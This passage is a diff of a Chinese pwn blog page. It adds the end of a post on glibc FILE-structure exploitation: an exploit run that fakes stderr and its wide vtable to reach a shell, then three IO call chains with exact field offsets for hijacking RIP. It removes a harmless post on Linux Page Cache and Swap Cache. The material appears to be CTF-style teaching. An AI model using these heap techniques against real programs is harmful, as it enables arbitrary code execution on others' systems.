class="number">1</span>: change <span class="built_in">stderr</span>-&gt;_flags to <span class="number">0x800</span></span><br><span class="line">[+] step <span class="number">2</span>: change <span class="built_in">stderr</span>-&gt;_mode to <span class="number">1</span></span><br><span class="line">[+] step <span class="number">3</span>: change <span class="built_in">stderr</span>-&gt;vtable to _IO_wstrn_jumps<span class="number">-0x20</span></span><br><span class="line">[+] step <span class="number">4</span>: replace <span class="built_in">stderr</span>-&gt;_wide_data with the allocated chunk p1</span><br><span class="line">[+] step <span class="number">5</span>: <span class="built_in">set</span> <span class="built_in">stderr</span>-&gt;_wide_data-&gt;_wide_vtable with the allocated chunk p2</span><br><span class="line">[+] step <span class="number">6</span>: <span class="built_in">set</span> <span class="built_in">stderr</span>-&gt;_wide_data-&gt;_wide_vtable-&gt;_IO_write_ptr &gt;  <span class="built_in">stderr</span>-&gt;_wide_data-&gt;_wide_vtable-&gt;_IO_write_base</span><br><span class="line">[+] step <span class="number">7</span>: put backdoor at fake _wide_vtable-&gt;_overflow</span><br><span class="line">[+] step <span class="number">8</span>: <span class="function">call <span class="title">fflush</span><span class="params">(<span class="built_in">stderr</span>)</span> to trigger backdoor func</span></span><br><span class="line"><span class="function">$ whoami</span></span><br><span class="line"><span class="function">yhellow</span></span><br></pre></td></tr></table></figure>
+<p>下面给出几条好用的调用链及其利用方式：</p>
+<p>利用 <code>_IO_wfile_overflow</code> 函数控制程序执行流</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_IO_wfile_overflow -&gt; _IO_wdoallocbuf -&gt; _IO_WDOALLOCATE -&gt; *(fp-&gt;_wide_data-&gt;_wide_vtable + <span class="number">0x68</span>)(fp)</span><br></pre></td></tr></table></figure>
+<ul>
+<li><code>_flags</code> = <code>~(2 | 0x8 | 0x800)</code></li>
+<li><code>vtable</code> = <code>_IO_wfile_jumps/_IO_wfile_jumps_mmap/_IO_wfile_jumps_maybe_mmap</code> 的地址（加减偏移）</li>
+<li><code>_wide_data</code> = 可控堆地址<code>A</code>（即满足 <code>*(fp+0xa0)=A</code>）</li>
+<li><code>_wide_data-&gt;_IO_write_base</code> = <code>0</code>（即满足 <code>*(A+0x18)=0</code>）</li>
+<li><code>_wide_data-&gt;_IO_buf_base</code> = <code>0</code>（即满足 <code>*(A+0x30)=0</code>）</li>
+<li><code>_wide_data-&gt;_wide_vtable</code> = 可控堆地址<code>B</code>（即满足 <code>*(A+0xe0)=B</code>）</li>
+<li><code>_wide_data-&gt;_wide_vtable-&gt;doallocate</code> = 地址<code>C</code>，用于劫持 <code>RIP</code>（即满足 <code>*(B+0x68)=C</code>）</li>
+</ul>
+<p>利用 <code>_IO_wfile_underflow_mmap</code> 函数控制程序执行流</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_IO_wfile_underflow_mmap -&gt; _IO_wdoallocbuf -&gt; _IO_WDOALLOCATE -&gt; *(fp-&gt;_wide_data-&gt;_wide_vtable + <span class="number">0x68</span>)(fp)</span><br></pre></td></tr></table></figure>
+<ul>
+<li><code>_flags</code> = <code>~4</code></li>
+<li><code>vtable</code> 设置为 <code>_IO_wfile_jumps_mmap</code> 地址（加减偏移）</li>
+<li><code>_IO_read_end &gt; _IO_read_ptr</code>（不进入调用）</li>
+<li><code>_wide_data</code> 设置为可控堆地址 <code>A</code>（即满足<code>*(fp+0xa0)=A</code>）</li>
+<li><code>_wide_data-&gt;_IO_read_ptr &gt;= _wide_data-&gt;_IO_read_end</code>（即满足<code>*A&gt;=*(A+8)</code>）</li>
+<li><code>_wide_data-&gt;_IO_buf_base</code> = <code>0</code>（即满足<code>*(A+0x30)=0</code>）</li>
+<li><code>_wide_data-&gt;_IO_save_base</code> = <code>0</code>（即满足<code>*(A+0x40)=0</code>）</li>
+<li><code>_wide_data-&gt;_wide_vtable</code> = 可控堆地址<code>B</code>（即满足<code>*(A+0xe0)=B</code>）</li>
+<li><code>_wide_data-&gt;_wide_vtable-&gt;doallocate</code> = 地址<code>C</code>，用于劫持 <code>RIP</code>（即满足<code>*(B+0x68)=C</code>）</li>
+<li>PS：这条链执行的条件是调用到 <code>_IO_wdefault_xsgetn</code> 时 <code>RDX</code> 寄存器不能为“0”</li>
+</ul>
+<p>利用 <code>_IO_wdefault_xsgetn</code> 函数控制程序执行流</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_IO_wdefault_xsgetn -&gt; __wunderflow -&gt; _IO_switch_to_wget_mode -&gt; _IO_WOVERFLOW -&gt; *(fp-&gt;_wide_data-&gt;_wide_vtable + <span class="number">0x18</span>)(fp)</span><br></pre></td></tr></table></figure>
+<ul>
+<li><code>_flags</code> = <code>0x800</code></li>
+<li><code>vtable</code> = <code>_IO_wstrn_jumps/_IO_wmem_jumps/_IO_wstr_jumps</code> 地址（加减偏移）</li>
+<li><code>_mode</code> &gt; <code>0</code>（即满足<code>*(fp+0xc0)&gt;0</code>）</li>
+<li><code>_wide_data</code> = 可控堆地址<code>A</code>（即满足<code>*(fp+0xa0)=A</code>）</li>
+<li><code>_wide_data-&gt;_IO_read_end == _wide_data-&gt;_IO_read_ptr</code> = <code>0</code>（即满足 <code>*(A+8)=*A</code>）</li>
+<li><code>_wide_data-&gt;_IO_write_ptr &gt; _wide_data-&gt;_IO_write_base</code>（即满足<code>*(A+0x20)&gt;*(A+0x18)</code>）</li>
+<li><code>_wide_data-&gt;_wide_vtable</code> = 可控堆地址<code>B</code>（即满足<code>*(A+0xe0)=B</code>）</li>
+<li><code>_wide_data-&gt;_wide_vtable-&gt;overflow</code> = 地址<code>C</code>，用于劫持<code>RIP</code>（即满足<code>*(B+0x18)=C</code>）</li>
+</ul>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
     <link itemprop="mainEntityOfPage" href="http://example.com/2022/11/05/myGDB/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1665,133 +1846,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/10/23/Linux%20Page%20Cache&Swap%20Cache/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="yhellow">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Pwn进你的心">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/10/23/Linux%20Page%20Cache&Swap%20Cache/" class="post-title-link" itemprop="url">Linux Page Cache&Swap Cache</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2022-10-23 14:26:08" itemprop="dateCreated datePublished" datetime="2022-10-23T14:26:08+08:00">2022-10-23</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2022-10-27 19:53:59" itemprop="dateModified" datetime="2022-10-27T19:53:59+08:00">2022-10-27</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Knowledge/" itemprop="url" rel="index"><span itemprop="name">Knowledge</span></a>
-                </span>
-            </span>
-
-          
-            <span class="post-meta-item" title="Symbols count in article">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-              <span>2k</span>
-            </span>
-            <span class="post-meta-item" title="Reading time">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-              <span>2 mins.</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p><strong>Struct address_space</strong></p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> &#123;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> flags</span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">			<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">lru</span>;</span></span><br><span class="line">			<span class="class"><span class="keyword">struct</span> <span class="title">address_space</span> *<span class="title">mapping</span>;</span></span><br><span class="line">            ......</span><br></pre></td></tr></table></figure>
-<ul>
-<li>在结构体 <code>page</code> 中有一个特殊的成员 <code>mapping</code>，指向地址空间描述的结构指针</li>
-<li>结构体 <code>file</code> 和结构体 <code>inode</code> 中都有一个结构体 <code>address_space</code> 指针（<code>file-&gt;f_mapping</code> 是由 <code>inode-&gt;i_mapping</code> 初始化而来）</li>
-</ul>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">address_space</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">inode</span>		*<span class="title">host</span>;</span> <span class="comment">/* 拥有此address_space的inode对象 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">xarray</span>		<span class="title">i_pages</span>;</span> <span class="comment">/* 缓存的页面(一种抽象的数据类型,其行为类似于一个非常大的指针数组) */</span></span><br><span class="line">	<span class="keyword">gfp_t</span>			gfp_mask; <span class="comment">/* 用于分配页的内存分配标志 */</span></span><br><span class="line">	<span class="keyword">atomic_t</span>		i_mmap_writable; <span class="comment">/* VM_SHARED计数 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">rb_root_cached</span>	<span class="title">i_mmap</span>;</span> <span class="comment">/* 私有映射链表的树 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">rw_semaphore</span>	<span class="title">i_mmap_rwsem</span>;</span> <span class="comment">/* 读写信号量 */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span>		nrpages; <span class="comment">/* 总页数 */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span>		nrexceptional; <span class="comment">/* Shadow or DAX条目,受i_pages锁保护 */</span></span><br><span class="line">	<span class="keyword">pgoff_t</span>			writeback_index; <span class="comment">/* 回写的起始偏移 */</span></span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">address_space_operations</span> *<span class="title">a_ops</span>;</span> <span class="comment">/* address_space的操作表 */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span>		flags; <span class="comment">/* gfp_mask掩码与错误标识 */</span></span><br><span class="line">	<span class="keyword">errseq_t</span>		wb_err; </span><br><span class="line">	<span class="keyword">spinlock_t</span>		private_lock; <span class="comment">/* 私有address_space自旋锁 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>	<span class="title">private_list</span>;</span> <span class="comment">/* 私有address_space链表 */</span></span><br><span class="line">	<span class="keyword">void</span>			*private_data; <span class="comment">/* 私有数据指针 */</span></span><br><span class="line">&#125; __attribute__((aligned(<span class="keyword">sizeof</span>(<span class="keyword">long</span>)))) __randomize_layout;</span><br></pre></td></tr></table></figure>
-<ul>
-<li>结构 <code>address_space-&gt;i_pages</code> 的作用就是用于存储文件的 Page Cache</li>
-<li>一个 <code>address_space</code> 与一个偏移量能够确定一个 <code>page cache</code> 或 <code>swap cache</code> 中的一个页面</li>
-</ul>
-<p><strong>Page Cache</strong></p>
-<p>所以为了避免每次读写文件时，都需要对硬盘进行读写操作，Linux 内核使用页缓存（Page Cache）机制来对文件中的数据进行缓存</p>
-<ul>
-<li>Page Cache 是与文件映射对应的</li>
-</ul>
-<img src="/2022/10/23/Linux%20Page%20Cache&Swap%20Cache/20200217091156249.png" class width="20200217091156249">  
-<ul>
-<li>用户对文件的读写会先操作 Page Cache，如果找不到对应的 Page Cache 就会申请一个</li>
-<li>修改的页缓存 Page Cache 被称为脏页，内核会定时把这些脏页刷新到文件中</li>
-</ul>
-<p>如果进程需要 <code>page</code> 而 <code>free page</code> 严重短缺的时候，进程可以唤醒这些内核线程来回收缓存的页面，一方面缓存，一方面回收达到一种平衡，同时改善了系统的性能</p>
-<p><strong>Swap</strong></p>
-<p>在 Linux 下，当物理内存不足时，拿出部分硬盘空间当 Swap 分区（也被称为“虚拟内存”，从硬盘中划分出的一个分区），从而解决内存容量不足的情况</p>
-<ul>
-<li>Swap 意思是交换， 当物理内存不够用的时候，内核就会释放缓存区（buffers/cache）里一些长时间不用的程序，然后将这些程序临时放到 Swap 中 </li>
-<li>Swap Out：当某进程向OS请求内存发现不足时，OS会把内存中暂时不用的数据交换出去，放在 SWAP 分区中</li>
-<li>Swap In：当某进程又需要这些数据且OS发现还有空闲物理内存时，又会把 Swap 分区中的数据交换回物理内存中</li>
-</ul>
-<p><strong>Swap Cache</strong></p>
-<p>Swap Cache 就是 Swap 的缓存，它的作用不是说要加快磁盘的I/O效率</p>
-<ul>
-<li>Swap Cache 是与匿名页对应的</li>
-<li>匿名页是没有关联任何文件的 <code>page</code>，比如用户进程通过 <code>malloc</code> 申请的内存页（函数 <code>mmap</code> 也可以申请匿名页）</li>
-</ul>
-<img src="/2022/10/23/Linux%20Page%20Cache&Swap%20Cache/20200218152259263.png" class width="20200218152259263"> 
-<p>Swap Cache 主要是为了防止页面在 Swap In 和 Swap Out 时进程的同步问题</p>
-<ul>
-<li>如果页面的数据还没有完全写入磁盘时，这个 <code>page frame</code> 是在 swap cache</li>
-<li>等数据完全写入磁盘后，而且没有进程对 <code>page frame</code> 进行访问，那么 swap cache 才会释放 <code>page frame</code>，将其交给 buddy system</li>
-<li>匿名页即将被 Swap Out 时会先被放进 Swap Cache，但通常只存在很短暂的时间，因为紧接着在该 <code>page</code> 完全放入磁盘之后它就会从 Swap Cache 中删除（毕竟 Swap Out 的目的就是为了腾出空闲内存）</li>
-</ul>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1863,7 +1917,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">263</span>
+          <span class="site-state-item-count">264</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -1917,7 +1971,7 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="Reading time total">53:44</span>
+    <span title="Reading time total">53:47</span>
 </div>
   <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
   </div>
